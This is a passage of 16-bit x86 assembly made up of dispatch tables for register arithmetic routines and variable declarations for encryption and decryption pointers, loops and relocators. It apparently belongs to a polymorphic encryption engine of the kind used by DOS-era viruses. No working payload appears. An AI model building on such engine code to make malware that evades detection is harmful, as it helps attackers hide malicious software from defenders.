        db      add_reg_reg_table_end - $ - 3
        dw      offset _add_reg_reg
        dw      offset add_reg_reg_reg_reg
add_reg_reg_table_end:

sub_reg_reg_table:
        db      sub_reg_reg_table_end - $ - 3
        dw      offset _sub_reg_reg
        dw      offset sub_reg_reg_reg_reg
sub_reg_reg_table_end:

add_reg_xxxx_table:
        db      add_reg_xxxx_table_end - $ - 3
        dw      offset _add_reg_xxxx
        dw      offset _add_reg_xxxx
        dw      offset _add_reg_xxxx_reg_reg
        dw      offset sub_reg_xxxx1
        dw      offset _add_reg_xxxx_inc_add
        dw      offset _add_reg_xxxx_dec_add
        dw      offset _add_reg_xxxx_add_add
        dw      offset _add_reg_xxxx_add_add

add_reg_xxxx_table_end:

endif

if vars eq 0
else

_nest                   db      ?       ; needed to prevent infinite recursion
_relocate_amt           db      ?

_loopstartencrypt       dw      ?
_loopstartdecrypt       dw      ?

_encryptpointer         dw      ?
_decryptpointer         dw      ?

_decryptpointer2        dw      ?

_start_encrypt          dw      ?
_start_decrypt          dw      ?

_used_regs              db      8 dup (?) ; 0 = unused
                                                        beginclear1:
_encrypt_relocate_num   dw      ?
_encrypt_relocator      dw      8 dup (?)

_decrypt_relocate_num   dw      ?
_decrypt_relocator      dw      10 dup (?)
                                                        endclear1:
_encrypt_length         dw      ?       ; based upon alignment

_counter_value          dw      ?       ; _counter_reg
_pointer_value          dw      ?
_decrypt_value          dw      ?

_dummy_reg              db      ?
_counter_reg            db      ?
_pointer_reg            db      ?       ; 4 = not in use
_encrypt_reg            db      ?

endif

